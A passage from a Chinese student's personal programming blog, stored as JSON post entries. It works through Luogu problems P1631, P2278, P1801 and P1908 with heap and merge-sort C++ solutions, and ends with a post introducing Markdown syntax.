写在最后有没有感觉篇博客明显变短了鸭哈哈哈 我感觉我太啰嗦了，而且一般写的思考过程和试错鸭什么的辣些一般我也不会怎么看的hhhh 最近在复习 (从0基础开始学) 动态规划呢，感觉好难鸭哈哈哈 最大的问题就是转移方程的推导了嗯嗯，没看见这个转移方程的时候我根本推不出来哈哈哈 (难道是我题解看多了) 加油扒~顺便背包九讲的东东我打算往笔记本里记廖，这里就不复述辣","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"}]},{"title":"Question-P1631","date":"2019-12-04T08:12:07.000Z","path":"2019/12/04/questions/Question-P1631/","text":"P1631题目描述有两个长度都是N的序列A和B，在A和B中各取一个数相加可以得到$N^{2}$个和，求这$N^{2}$个和中最小的N个。 输入格式第一行一个正整数N； 第二行N个整数$A_{i}$, 满足$A_{i}$ &lt;= $A_{i+1}$且 $A_{i}$ ≤$10^{9}$; 第三行N个整数$B_{i}$, 满足$B_{i}$ &lt;= $B_{i+1}$且 $B_{i}$ ≤$10^{9}$. 【数据规模】对于50%的数据中，满足1&lt;=N&lt;=1000； 对于100%的数据中，满足1&lt;=N&lt;=100000。 输出格式输出仅一行，包含N个整数，从小到大输出这N个最小的和，相邻数字之间用空格隔开。 输入输出样例输入 #1 3 2 6 6 1 4 8输出 #1 3 6 7 听音乐~ 解这个题真的不难，但是非常的具有代表性QAQ 下面这个题用这个题的模板做，改改value的计算方式就AC了…… 链接：P2085 所以还不多康康这种题？！！ introa和b是以升序排布的嘛 (这一点我一开始居然没有看出来！QAQ我个瞎子) 然后求的是 a + b 的前几个最小值 从数据范围看出来要的是O(nlgn) 暴力暴力做法，那就是申个二维数组挨个算 不仅从时间上(O($n^{2}$))超了，空间也超了 在第n个小的求和之外所花费的时间和空间全部多余了 研究如何使得多余的计算被避免掉，那就需要从暴力做法还没有讨论到的特殊性质出发辣 暴力做法二维数组的性质那我们先打个表出来 横行是a数组，纵行是b数组 a\\b 1 3 4 5 7 9 1 2 4 5 6 8 10 2 3 5 6 7 9 11 4 5 7 8 9 11 13 6 7 9 10 11 13 15 8 9 11 12 13 15 17 9 10 12 14 15 17 19 很明显，最小的数字应该从左上往右下取得 还有一个性质： 如果要取(i,j)，必须要保证(i,j-1)与(i-1,j)被取得 因为(i,j-1)与(i-1,j)都比(i,j)要小 反映到图上，由于这是一条可以递归的性质，图要求这个节点的左上所构成的矩形全部被取到 然后还有个最基础的性质，(1,1)一定会被取到 那么就可以从(1,1)开始，先打印(1,1) 判断出(1,2)与(2,1)都符合比较的规则 然后比较(1,2)与(2,1) 按照图来，打印(2,1) 判断(3,1)符合规则，(2,2)由于(1,2)还没有被取到，不符合规则 比较(3,1)与(1,2) …… 注意到前面的比较被淘汰的仍然参与下一次比较 每一次比较只选出最小的值 想到了什么？？堆！ 接下来还有两个问题需要讨论： 如何判断是否符合规则 如何比较堆的值(&gt; &lt; =) 1. 如何判断是否符合规则即是判断二维数组左上角的矩形中有没有没被选择上的数字 考虑到如果(i,j)被选择到了，那么(i,j)左上角的矩形都被选择到了 所以要看(i + 1, j + 1)左上方是否有空，就是看其左方的数字的左上方是否有空，上方的数字的左上方是否有空，也就是看左方的数字是否为空，上方的数字是否为空 这不是让你递归啊=-= 就是把(i + 1,j + 1)的判断转移到了(i,j+1)与(i+1,j)上 以左边为例 判断左边是否为空，第一想到的就是设置一个矩阵……超空间了 然后依据最小的性质，可以比较左边和刚刚输出的数字，如果小就是已经输出过了 –如果左边的数字和刚刚输出的数字相等呢？那我们可以做一个规定，默认堆排序的时候在 值大小 的优先级之下比较谁更靠左 这样也解决了问题2. 代码#include &lt;iostream&gt; using namespace std; int a[105000], b[105000], n, length = 0; struct Node { int value; int left; int right; }heap[105000]; void SwapHeap(int p1, int p2) { swap(heap[p1].left, heap[p2].left); swap(heap[p1].right, heap[p2].right); swap(heap[p1].value, heap[p2].value); } void HeapifyFromDownToUp(int k) { if(k &gt; 1) { int parent = k / 2; if(heap[parent].value &gt; heap[k].value) { SwapHeap(parent, k); HeapifyFromDownToUp(parent); } else if(heap[parent].value == heap[k].value &amp;&amp; heap[parent].right &gt; heap[k].right) //在value大小的优先级之下比较right { SwapHeap(parent, k) ; HeapifyFromDownToUp(parent); } } } void HeapifyFromUpToDown(int k) { if(k &lt;= length / 2) { int rChild = k * 2 + 1; int lChild = k * 2; int minChild; if(rChild &gt; length) minChild = lChild; else { if(heap[rChild].value &lt; heap[lChild].value) minChild = rChild; else if(heap[rChild].value &gt; heap[lChild].value) minChild = lChild; else if(heap[rChild].value == heap[lChild].value) { minChild = heap[lChild].right &lt;= heap[rChild].right ? lChild : rChild; } } if(heap[minChild].value &lt; heap[k].value) { SwapHeap(minChild, k); HeapifyFromUpToDown(minChild); } else if(heap[minChild].value == heap[k].value &amp;&amp; heap[minChild].right &lt; heap[k].right) //在value大小的优先级之下比较right { SwapHeap(minChild, k); HeapifyFromUpToDown(minChild); } } } void Put(int le, int r) { length++; heap[length].left = le; heap[length].right = r; heap[length].value = a[le] + b[r]; HeapifyFromDownToUp(length); } Node Push() { Node temp; temp.left = heap[1].left; temp.right = heap[1].right; temp.value = heap[1].value; SwapHeap(1, length); length--; HeapifyFromUpToDown(1); return temp; } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;a[i]; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;b[i]; Put(1, 1); for(int i = 1; i &lt;= n; i++) { Node temp = Push(); cout&lt;&lt;temp.value&lt;&lt;&quot; &quot;; int r = temp.right; int le = temp.left; //这里有一个边界条件鸭 if(r - 1 == 0 || a[le + 1] + b[r - 1] &lt;= a[le] + b[r]) //这个小于等于就是默认规定辣 Put(le + 1, r); if(le - 1 == 0 || a[le - 1] + b[r + 1] &lt; a[le] + b[r]) Put(le, r + 1); } return 0; }我居然把函数名搞错了还居然花了我一个下午调试 解2还可以这样想呢~ 等我先把表格搬过来，嘿咻~ a\\b 1 3 4 5 7 9 1 2 4 5 6 8 10 2 3 5 6 7 9 11 4 5 7 8 9 11 13 6 7 9 10 11 13 15 8 9 11 12 13 15 17 9 10 12 14 15 17 19 把每一行当做优先队列，将第一列的值存入堆，输出最小值时把对应的行的下一列的值放入堆 也就是把表格横着扫一遍~ 当然这是其他dalao的思路，我搬过来而已QAQ 这样想更简单了 没有什么默认规则了，代码就舒服多了QAQ #include &lt;iostream&gt; using namespace std; int a[105000], b[105000], length = 0, n; struct Node { int value; int p1; int p2; }heap[500000]; void HeapifyUTD(int k) { if(k &lt;= length / 2) { int rChild = k * 2 + 1, lChild = k * 2, minChild; if(lChild == length) minChild = lChild; else minChild = heap[lChild].value &lt; heap[rChild].value ? lChild : rChild; if(heap[k].value &gt; heap[minChild].value) { swap(heap[k], heap[minChild]); HeapifyUTD(minChild); } } } Node Get() { Node tmp; tmp.p1 = heap[1].p1; tmp.p2 = heap[1].p2; tmp.value = heap[1].value; swap(heap[1], heap[length]); length--; HeapifyUTD(1); return tmp; } void HeapifyDTU(int k) { int parent = k / 2; if(parent &gt; 0) if(heap[k].value &lt; heap[parent].value) { swap(heap[k], heap[parent]); HeapifyDTU(parent); } } void Put(int p1, int p2) { length++; heap[length].p1 = p1; heap[length].p2 = p2; heap[length].value = a[p1] + b[p2]; HeapifyDTU(length); } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;a[i]; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;b[i]; for(int i = 1; i &lt;= n; i++) Put(i, 1); for(int i = 1; i &lt;= n; i++) { Node tmp = Get(); cout&lt;&lt;tmp.value&lt;&lt;&quot; &quot;; Put(tmp.p1, tmp.p2 + 1); } return 0; } 归纳： 遇见可以用 表格/暴力 做 超空间/超时间 的题,不妨先按着 表格/暴力做法 推几个数据找性质,然后根据性质选择性地从 表格/暴力做法 中筛选 需要的元素和需要的步骤 最后提一嘴 P2085 中的数组是[x][n]呢","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"Question-P2278","date":"2019-11-30T14:06:45.000Z","path":"2019/11/30/questions/Question-P2278/","text":"P2278题目描述写一个程序来模拟操作系统的进程调度。假设该系统只有一个CPU，每一个进程的到达时间，执行时间和运行优先级都是已知的。其中运行优先级用自然数表示，数字越大，则优先级越高。 如果一个进程到达的时候CPU是空闲的，则它会一直占用CPU直到该进程结束。除非在这个过程中，有一个比它优先级高的进程要运行。在这种情况下，这个新的（优先级更高的）进程会占用CPU，而老的只有等待。 如果一个进程到达时，CPU正在处理一个比它优先级高或优先级相同的进程，则这个（新到达的）进程必须等待。 一旦CPU空闲，如果此时有进程在等待，则选择优先级最高的先运行。如果有多个优先级最高的进程，则选择到达时间最早的。 输入格式输入包含若干行，每一行有四个自然数（均不超过10^8），分别是进程号，到达时间，执行时间和优先级。不同进程有不同的编号，不会有两个相同优先级的进程同时到达。输入数据已经按到达时间从小到大排序。输入数据保证在任何时候，等待队列中的进程不超过15000个。 输出格式按照进程结束的时间输出每个进程的进程号和结束时间。 输入输出样例输入 #11 1 5 3 2 10 5 1 3 12 7 2 4 20 2 3 5 21 9 4 6 22 2 4 7 23 5 2 8 24 2 4 输出 #11 6 3 19 5 30 6 32 8 34 4 35 7 40 2 42 听音乐~ 白2的歌就是好听鸭~ 先扯一点废话没想到这么快就又摆上优先队列了哈哈哈哈哈真是巧合呢 (我居然又一次一次过了提高+/省选-的题) ↑你飘了↑ 解其实一开始我是没想优先队列的 你想嘛，优先级最大的， 最！~ 好的用堆 (不愧是我) (我真的受堆毒害不浅啊！) 好的好的，第一个想到的问题是怎么处理堆 即： 堆排序的规则 什么时候该添加节点 什么时候该拉取节点 如何处理时间 堆排序的规则题目说了，应该选取优先度最高的，同优先度相比时间最早的 所以总体来说就是一个最大堆廖 什么时候该添加节点呢？嗯..好问题 (自吹自擂？？！) 应该在有新的进程到达的时候添加 那么该怎么判断是否进程到达呢？ 设置一个循环，每循环一次到达一个进程 什么时候该拉取节点应该在这个进程处理完毕的时候拉取吧 进程在给的时间范围内已经被处理掉，就拉取一次进程 如果按照第一个问题走，这个过程应该是递归/递推的 如何处理时间嗯..这是一个意义深远的问题，至今我们也不知道会不会有穿越时间的能力存在 (↑胡扯↑你就给我皮↑) 这里的答案就是不要把时间看成连续抽象的，把时间分段，当需要处理事件时就拉取一次时间 问出这些问题，想必你已经对过程有了个大体的认识扒 过程↓2： 依次输入每个进程的参数(四个，优先度，编号，开始时间，持续时间)↓1： 如果堆非空 计算上次输入到这次输入的时间差 如果时间差 &gt; 正在执行的进程的持续时间(即这个进程是否执行完毕) (剩余的)时间差 = 时间差 - 正在执行的进程的持续时间 拉取优先度最大的节点，维护堆的性质 继续执行1: 如果堆非空(即是否还在执行进程) 正在执行的进程的持续时间 - (剩余的)时间差 将此输入入堆，维护堆的性质 存下这次输入进程的参数，传递给下次循环 继续进行2: 算法这里使用了结构体 #include &lt;iostream&gt; #define MAXSIZE 15500 using namespace std; int length = 0; struct A { int prior; int num; int stTime; int lastTime; }maxHeap[MAXSIZE]; void SwapHeap(int p1, int p2) { swap(maxHeap[p1].lastTime, maxHeap[p2].lastTime); swap(maxHeap[p1].num, maxHeap[p2].num); swap(maxHeap[p1].prior, maxHeap[p2].prior); swap(maxHeap[p1].stTime, maxHeap[p2].stTime); } void HeapifyFromUpToDown(int position) { if(position &lt;= length / 2) { int lChild = position * 2; int rChild = position * 2 + 1; int maxChild; if(rChild &gt; length) maxChild = lChild; else if(maxHeap[lChild].prior == maxHeap[rChild].prior) { if(maxHeap[lChild].stTime &lt;= maxHeap[rChild].stTime) maxChild = lChild; else maxChild = rChild; } else maxChild = maxHeap[lChild].prior &gt; maxHeap[rChild].prior ? lChild : rChild; if(maxHeap[maxChild].prior == maxHeap[position].prior) { if(maxHeap[maxChild].stTime &lt;= maxHeap[position].stTime) { SwapHeap(maxChild, position); HeapifyFromUpToDown(maxChild); } } else if(maxHeap[maxChild].prior &gt; maxHeap[position].prior) { SwapHeap(maxChild, position); HeapifyFromUpToDown(maxChild); } } } void HeapifyFromDownToUp(int position) { int parent = position / 2; if(parent &gt; 0) { if(maxHeap[parent].prior == maxHeap[position].prior) { if(maxHeap[parent].stTime &gt;= maxHeap[position].stTime) { SwapHeap(parent, position); HeapifyFromDownToUp(parent); } } else if(maxHeap[parent].prior &lt; maxHeap[position].prior) { SwapHeap(parent, position); HeapifyFromDownToUp(parent); } } } void PushMaxHeap() { SwapHeap(1, length); length--; HeapifyFromUpToDown(1); } void PutMaxHeap(int prior, int num, int stTime, int lastTime) { length++; maxHeap[length].prior = prior; maxHeap[length].num = num; maxHeap[length].stTime = stTime; maxHeap[length].lastTime = lastTime; HeapifyFromDownToUp(length); } int main() { int prior, num, stTime, durTime, timePass; int lastPrior, lastNum, lastStTime, lastDurTime; while(cin&gt;&gt;num&gt;&gt;stTime&gt;&gt;durTime&gt;&gt;prior) { if(length != 0) { timePass = stTime - lastStTime; while( length != 0 &amp;&amp; timePass &gt;= maxHeap[1].lastTime ) { cout&lt;&lt;maxHeap[1].num&lt;&lt;&quot; &quot;; timePass = timePass - maxHeap[1].lastTime; cout&lt;&lt;stTime - timePass&lt;&lt;endl; PushMaxHeap(); } if(length != 0) maxHeap[1].lastTime = maxHeap[1].lastTime - timePass; } PutMaxHeap(prior, num, stTime, durTime); lastNum = num; lastPrior = prior; lastStTime = stTime; lastDurTime = durTime; } int time = lastStTime; if(length != 0) { while(length != 0) { cout&lt;&lt;maxHeap[1].num&lt;&lt;&quot; &quot;; cout&lt;&lt;time + maxHeap[1].lastTime&lt;&lt;endl; time = time + maxHeap[1].lastTime; PushMaxHeap(); } } return 0; } 复杂度分析全是条件句分析好难啊 我还是根据结果论分析吧 时间就约等于1s吧，数据量应该是满的，15000 查一下表得知，是O(nlgn) 下表记住廖： 复杂度 下限 上限 O(logN) 10^20 很大 O(N^1/2) 10^12 10^14 O(N) 10^6 10^7 O(NlogN) 10^5 10^6 O(N^2) 1000 2500 O(N^3) 100 500 O(N^4) 50 50 O(2^N) 20 20 O(N!) 9 10","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"模拟","slug":"模拟","permalink":"https://v25bh145.github.io/tags/%E6%A8%A1%E6%8B%9F/"}]},{"title":"Question-P1801","date":"2019-11-30T10:25:11.000Z","path":"2019/11/30/questions/Question-P1801/","text":"P1801题目描述Black Box是一种原始的数据库。它可以储存一个整数数组，还有一个特别的变量i。最开始的时候Black Box是空的．而i等于0。这个Black Box要处理一串命令。 命令只有两种： ADD(x):把x元素放进BlackBox; GET:i加1，然后输出Blackhox中第i小的数。 记住：第i小的数，就是Black Box里的数的按从小到大的顺序排序后的第i个元素。例如： 我们来演示一下一个有11个命令的命令串。（如下图所示） 现在要求找出对于给定的命令串的最好的处理方法。ADD和GET命令分别最多200000个。现在用两个整数数组来表示命令串： 1.A(1)，A(2)，…A(M)：一串将要被放进Black Box的元素。每个数都是绝对值不超过2000000000的整数，M$200000。例如上面的例子就是A=(3，1，一4，2，8，-1000，2)。 2.u(1)，u(2)，…u(N)：表示第u(j)个元素被放进了Black Box里后就出现一个GET命令。例如上面的例子中u=(l，2，6，6)。输入数据不用判错。 输入格式第一行，两个整数，M，N。 第二行，M个整数，表示A(l) ……A(M)。 第三行，N个整数，表示u(l) …u(N)。 输出格式输出Black Box根据命令串所得出的输出串，一个数字一行。 输入输出样例输入 #1 7 4 3 1 -4 2 8 -1000 2 1 2 6 6输出 #1 3 3 1 2说明/提示对于30%的数据，M≤10000; 对于50%的数据，M≤100000： 对于100%的数据，M≤200000。 听音乐 解康康这道题辣，给出了m的数据范围在200000之内分析下时间复杂度应该是要求 O(mlgm) 题目的意思大概就是 需要给出在加入第i个元素的排序序列时需要序列第j个小的值 j是自增的 而i是任意给定的自增数列 (题目没说我差点就想再来个排序了) 然后题把加入和查询单独两列列开了，用最简单的模拟显然是不阔以加入一个检测一个的 所以先把add和get操作存进数组里，后续再一并处理： for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmp; putOp[i] = tmp; } for(int i = 1; i &lt;= n; i++) { cin&gt;&gt;tmp; getOp[i] = tmp; }之后的处理也大概能写个框架出来 headGet = 1; for(int i = 1;i &lt;= m; i++) { //Mark.1 //对putOp[i]进行处理 while(getOp[headGet] == i) { //Mark.2 //对getOp[headGet]进行处理 cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } }这里需要注意一下while,题目实例就给出了get重复的i值 我才不是因为一开始写的if等到写完了算法回去再测试的时候菜发现的呢 (菜) 好了，那我们来填补一下里面的操作扒 Mark.1:这里如果想要实现的话，最暴力的操作就是插入排序，把putOp[i]插入到数组中 同时使得数组的升序不变性保持不变 时间复杂度：theta($m^{2}$) 明显超了 嗯就先这么来吧，暴力解get Mark.2:如果按照上文的插入排序，这里就十分简单辣 直接返回a[i]就可以辣 来康暴力代码：仅仅展示了一些暴力插入排序 为了博客效果写了份暴力代码还不快夸我 void InsertArray(int k) { length++; array[length] = k; if(length != 1) { for(int i = length - 1; i &gt;= 1; i--) { if(array[i + 1] &lt; array[i]) swap(array[i + 1], array[i]); else break; } } } int main() { for(int i = 1;i &lt;= m; i++) { InsertArray(putOp[i]); while(getOp[headGet] == i) { tmp = array[headGet]; cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } } return 0; }果然暴力插♂入只有30分嘛 好的继续，现在我们需要优化程序廖 插入排序的优化Mark.1这里的插入消耗时间显然过长，一定需要在这里优化 来一波分析，如果需要theta(mlgm) 外部的循环已经配了一层m了，所以里面的要求只能是最多lgm 然后需要的是第i大的数…第i大…第 很容易想到堆的性质鸭！！ 所以我们先建一个最小堆 这样在这里的操作复杂度就是O(lgm)廖 接下来甩锅给Mark.2同学 Mark.2这里需要获取第headGet小的值 能做的就是类似堆排序一样的东东，不断从堆顶拔头发取数字，然后交换最后一个让最后一个顺下去，取headGet遍 恭喜我得出来这个玩意儿：O($m^{2}$lgm) 怎么来的？考虑最坏情况为在put(m)处连续get(m)次，也就是堆排序辣 这个算法使得Mark.2更暴力辣，Mark.2号同学肯定不服气了，把锅儿一巴掌呼回了Nark.1 堆的优化需要优化Mark.2，这时我们把眼光看向瑟瑟发抖的Mark.1 我们可以在Mark.1上加入一些时间来简化Mark.2的时间 怎么做呢？ 好戏来了这里考虑到Mark.2在获取第headGet大的数据时多执行了headGet - 1次 有什么办法直接获取到第headGet大的数字呢？ 我们可以让第headGet大的数字直接位于堆首，把比headGet小的数字扔进弃牌区里 在Mark.2读取完第headGet大的数据后，headGet++，然后把第headGet大的数据也扔进弃牌区里 这时回到Mark.1，我们在加入数据的时候需要在先跟弃牌区里的数字比较一下，然后挑出最大的放到最小堆里 诶，这里这个弃牌区怎么实现呢？ 首先考虑到弃牌区必须要有序 元素依次加入的同时维护有序性 所以我们自然想到了我们的老朋友–插入排序！ 别急，还没完！ 然后再次考虑到我们需要获取最大的元素 再想想刚刚的暴力插入排序转变的过程 终于发现了嘛？ 其实可以将弃牌区用最大堆实现！ 所以总体，复述一下操作： 执行putOp时 将其放入最大堆，维护最大堆性质 从最大堆挑出最大的元素，维护最大堆性质 将挑出的元素放入最小堆，维护最小堆性质 执行getOp时 从最小堆挑出最小的元素，维护最小堆性质 输出它 将挑出的元素放入最大堆，维护最大堆性质 最终的双堆数据结构代码：从输入到处理到输出都写上了 堆的维护好好康康鸭，两种维护方式(自顶向下，自叶向上)都要用上 #include &lt;iostream&gt; #define MAXSIZE 200500 using namespace std; int n,m; int maxLength = 0, minLength = 0; int minHeap[MAXSIZE], maxHeap[MAXSIZE],getOp[MAXSIZE],putOp[MAXSIZE]; void MinHeapifyUpToDown(int k) //up to down { if(k &lt;= minLength / 2) { int lChild = k * 2; int rChild = k * 2 + 1; int minChild; if(rChild &gt; minLength) minChild = lChild; else minChild = minHeap[lChild] &lt; minHeap[rChild] ? lChild : rChild; if(minHeap[k] &gt; minHeap[minChild]) { swap(minHeap[k], minHeap[minChild]); MinHeapifyUpToDown(minChild); } } } void MinHeapifyDownToUp(int k) //down to up { if(k / 2 &gt; 0) { int parent = k / 2; if(minHeap[parent] &gt; minHeap[k]) { swap(minHeap[parent], minHeap[k]); MinHeapifyDownToUp(parent); } } } void PutMinHeap(int k) { minLength++; minHeap[minLength] = k; MinHeapifyDownToUp(minLength); } int GetMinHeap() { int result = minHeap[1]; swap(minHeap[1], minHeap[minLength]); minLength--; MinHeapifyUpToDown(1); return result; } void MaxHeapifyDownToUp(int position) { int parent = position / 2; if(parent &gt; 0) { if(maxHeap[parent] &lt; maxHeap[position]) { swap(maxHeap[parent], maxHeap[position]); MaxHeapifyDownToUp(parent); } } } void MaxHeapifyUpToDown(int position) { if(position &lt;= maxLength / 2) { int maxChild; int lChild = position * 2; int rChild = position * 2 + 1; if(rChild &gt; maxLength) maxChild = lChild; else maxChild = maxHeap[lChild] &gt; maxHeap[rChild] ? lChild : rChild; if(maxHeap[position] &lt; maxHeap[maxChild]) { swap(maxHeap[position], maxHeap[maxChild]); MaxHeapifyUpToDown(maxChild); } } } void PutMaxHeap(int k) { maxLength++; maxHeap[maxLength] = k; MaxHeapifyDownToUp(maxLength); } int GetMaxHeap() { int result = maxHeap[1]; swap(maxHeap[1], maxHeap[maxLength]); maxLength--; MaxHeapifyUpToDown(1); return result; } int main() { cin&gt;&gt;m&gt;&gt;n; int tmp,headGet; for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmp; putOp[i] = tmp; } for(int i = 1; i &lt;= n; i++) { cin&gt;&gt;tmp; getOp[i] = tmp; } headGet = 1; for(int i = 1;i &lt;= m; i++) { PutMaxHeap(putOp[i]); tmp = GetMaxHeap(); PutMinHeap(tmp); while(getOp[headGet] == i) { tmp = GetMinHeap(); PutMaxHeap(tmp); cout&lt;&lt;tmp&lt;&lt;endl; headGet++; } } return 0; } 感想：这道题我居然一次做出来了诶，果然堆对我的毒害不浅哈哈哈哈 所以大概什么时候使用堆呢？ 插入排序的优化 “最”出现的时候 优先队列(早日遇上过来水水写写)","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"Question-P1908","date":"2019-11-26T10:36:39.000Z","path":"2019/11/26/questions/Question-P1908/","text":"P1908题目描述猫猫TOM和小老鼠JERRY最近又较量上了，但是毕竟都是成年人，他们已经不喜欢再玩那种你追我赶的游戏，现在他们喜欢玩统计。最近，TOM老猫查阅到一个人类称之为“逆序对”的东西，这东西是这样定义的：对于给定的一段正整数序列，逆序对就是序列中ai&gt;aj且i&lt;j的有序对。知道这概念后，他们就比赛谁先算出给定的一段正整数序列中逆序对的数目。 Update:数据已加强。 输入格式第一行，一个数n，表示序列中有n个数。 第二行n个数，表示给定的序列。序列中每个数字不超过10^9109 输出格式给定序列中逆序对的数目。 输入输出样例输入 #1 6 5 4 2 6 3 1输出 11说明/提示对于25%的数据，n \\leq 2500n≤2500 对于50%的数据，n \\leq 4 \\times 10^4n≤4×104 。 对于所有数据，n \\leq 5 \\times 10^5n≤5×105 请使用较快的输入输出 题外话听音乐~ 啊对了，忘了说廖，建立这个博客就是为了记录学编程的过程呢 大概是初二(初三？？ 反正我也不知道我跳的是初二还是初三hhh)开始学的C扒 然后高一试着搞了搞noip，高二喜提省二第一就放弃廖TAT 菜是原罪啊 现在大一廖，也不知道怎么脑子抽了报志愿就报了计算机专业hhh 终于决定痛改前非，去搞一搞ACM 总之就是你们面前这个写博客的蒟蒻又双叒叕开始学编程了QAQ 应该在博客里打算记一下这些东西： 算法题中过程出大问题的地方 Question 应该会按照算法分好类 一些奇♂妙的编程方法 Algorithm 一些编程科目的小笔记 Note 应该不多这个 嘛应该会记得很杂很杂…..尽量分个小类吧hhh 不啰嗦了hh 解嘛首先看到这道题，分析一波数据要求theta(nlgn) 然后首先考虑遍历数组，发现暴力做法就是遍历两遍数组： 暴力解法for(int i = 1; i &lt;= n; i++) for(int j = i + 1; j &lt;= n; j++&gt;) if(a[i] &gt; a[j]) count++;嗯就是这么暴力,自己求一遍逆，用计算机打出我的暴力思路hhh 然后发现题目标签有分治法，这道题可以用分治法来做 先拆分，一般都拆成二分一列数组的逆序数 = 中间靠左数组的逆序数 + 中间靠右数组的逆序数 + 两个子数组之间产生的逆序数 然后递归求解两边的逆序数，发现：原子问题： 两个数字的逆序数 最后要合并问题 这里我为难廖，怎么合并呢？也就是说，怎么求两个子数组之间产生的逆序数呢？ 先考虑暴力做法，跟上方的代码差不多，左边遍历一遍，然后嵌套里面，里面右边遍历一遍 有什么优化嘛？什么被重复计算了？ 我发现了：假设5&gt;2，5在2前面，如果有7&gt;5，7在2的前面，那么一定有7&gt;2 这里自然而然想到了排序，也就假设左右合并的数组已经排好序(升序)了 发现只用遍历一遍就能出结果 计数好右边的数字的数目 遍历整个排好升序的数组 如果遍历到右边的数字，计数– 如果遍历到左边的数字，结果 += 计数 如此得合并的时间复杂度为 排序的复杂度+一个单n 分治法1这里搞了一个结构体，用来暂存传入Merge()中的数组以及下标，并且排好序 //分治法的合并 int Merge(int l, int r) { for(int i = l; i &lt;= r; i++) { snot2[i].num = snot[i]; snot2[i].p = i; } VQuickSort(l, r); int count = 0, result = 0; for(int i = l; i &lt;= r; i++) { if(snot2[i].p &gt; ( l + r ) / 2) count++; if(snot2[i].p &lt;= ( l + r ) / 2) result += count; snot2[i].num = 0; snot2[i].p = 0; } return result; } //分治法的拆分和递归 int Rev(int l, int r) { if(l + 1 == r) { if(snot[l] &gt;= snot[r]) return 1; else return 0; } else if (l &lt; r) { int mid = ( l + r ) / 2; int leftValue = Rev(l, mid); int rightValue = Rev(mid + 1, r); int midValue = Merge(l, r); return leftValue + rightValue + midValue; } else return 0; }正确性：由循环不变式确定，正确 时间复杂度( T(1) = theta(1) )： T(n) = 2T(n / 2) + nlgn = theta(nlg(n)lg(n)) 嗯还是超了，事实证明只过了前50% 很明显问题出在Merge()上，每次都排一次序很麻烦 然后 这 个 时 候 我终于意识到了 这玩意跟归并排序好像啊！ 归并排序也有排序啊，也有分治啊 归并排序的Merge()部分，数组是由Partition部分排过序的 那么这个题也在Partition部分排个序也就行廖 分治法2其实这个题就是分治法加上一个返回值啊…… long long int Merge(int left, int right) { int mid = (left + right) / 2; int leftLength = right - mid; long long int result = 0; int k,p; k = mid; p = right; for(int i = 1; i &lt;= right - left + 1; i++) { if(k &lt; left) { mia[i] = snot[p]; p--; leftLength--; } else if(p &lt; mid + 1) { mia[i] = snot[k]; k--; } else if(snot[k] &lt;= snot[p]) { mia[i] = snot[p]; p--; leftLength--; } else if(snot[k] &gt; snot[p]) { mia[i] = snot[k]; k--; result += leftLength; } } for(int i = right - left + 1; i &gt;= 1; i--) { snot[left + right - left + 1 - i] = mia[i]; mia[i] = 0; } return result; } long long int Rev(int left, int right) { if(left &lt; right) { if(left + 1 == right) { if(snot[left] &gt; snot[right]) { swap(snot[left], snot[right]); return 1; } else return 0; } int mid = (left + right) / 2; long long int leftValue = Rev(left, mid); long long int rightValue = Rev(mid + 1, right); long long int midValue = Merge(left, right); return leftValue + rightValue + midValue; } return 0; }嗯，AC了，是我愚钝，把这道普及+的题看♂了QAQ 以后分治的时候可别再犯这种 过程重复计算使时间空间复杂度提高 的蠢错误了啊QAQ 欧系卖To be continued","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"分治法","slug":"分治法","permalink":"https://v25bh145.github.io/tags/%E5%88%86%E6%B2%BB%E6%B3%95/"}]},{"title":"我的第一个博客","date":"2019-11-26T09:28:19.000Z","path":"2019/11/26/我的第一个博客/","text":"首先，不管你是谁，总之欢迎来到我的博客鸭~ 听音乐~ 第一个博客文章，我就记一下.md的相关知识扒 学自菜鸟教程 https://www.runoob.com/markdown/md-tutorial.html 一. 标题标题一共六种鸭，一级到六级 一级标题二级标题三级标题四级标题五级标题六级标题# 一级标题 ## 二级标题 ### 三级标题 #### 四级标题 ##### 五级标题 ###### 六级标题 一级标题 ------- 二级标题 =======二. 段落的格式关于换行的话，有两种方式： 在一行尾部空出两个以上空格 多空一行 这两种方式有差别的亚子 段落的字体可以自己设置鸭 有这些： 星号星号可以插入在文本之间呢 斜体字~粗♂体字粗♂斜♂体 *斜体字~* **粗♂体字** ***粗♂斜♂体*** 下划线下划线只能在段首段位使用的斜体字~粗♂体字 _斜体字~_ __粗♂体字__ 分割线↓这个就是个分割线辣~~↓ *** * * * ***** - - - ------- 删除线删除线一一一(调皮) ~~删除线~~ 下划线这个 &lt;u&gt;下划线&lt;/u&gt; 脚注 脚注貌似无法使用emmmmm 三. 列表有序的和无序的： 第一项 第二项 第三项 * 第一项 * 第二项 * 第三项 + 第一项 + 第二项 + 第三项 - 第一项 - 第二项 - 第三项 qaq qaq qaq 1. qaq 2. qaq 3. qaq 然后还能嵌套,像酱紫 qaq qaq qaq qaq 